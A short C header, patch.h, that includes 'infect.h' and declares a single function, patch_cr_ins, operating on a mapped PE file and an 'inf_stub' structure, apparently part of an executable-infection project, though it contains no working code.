#ifndef PATCH_H
#define PATCH_H

#include "infect.h"

void patch_cr_ins(struct inf_info *pe_inf_info, void *pe_map,
		struct inf_stub *cur_stub);
#endif